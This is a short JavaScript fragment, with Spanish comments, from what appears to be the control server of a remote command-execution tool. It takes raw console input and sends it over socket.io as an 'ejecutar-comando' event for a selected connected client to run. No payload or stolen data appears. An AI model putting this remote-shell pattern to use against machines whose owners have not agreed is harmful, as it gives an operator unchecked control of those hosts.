    else if (cmd === 'cls') {
      console.clear();
    }
    else {
      // Enviar comando al cliente
      const comandoEnvio = input; // Input raw
      const comandoId = Date.now().toString();

      console.log(`[Enviando] -> ${cliTarget.nombre}: ${comandoEnvio}`);

      io.to(cliTarget.id).emit('ejecutar-comando', {
        comando: comandoEnvio,
        comandoId: comandoId
      });
    }
  }

  global.rl.prompt();
});

// Prompt inicial (delay para no pisar logs de inicio)
setTimeout(() => {
  global.rl.prompt();
}, 2000);
